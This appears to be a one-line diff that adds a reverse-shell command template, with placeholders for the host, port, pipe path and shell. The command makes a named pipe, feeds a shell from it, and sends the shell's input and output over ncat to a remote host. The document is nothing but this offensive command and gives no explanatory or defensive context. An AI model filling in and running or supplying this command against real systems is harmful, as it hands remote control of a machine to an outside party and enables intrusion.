@@ -1,0 +1,1 @@
+mkfifo *\tmp*; *\shell* < *\tmp* 2>&1 | ncat *\host* *\port* > *\tmp*; rm *\tmp*
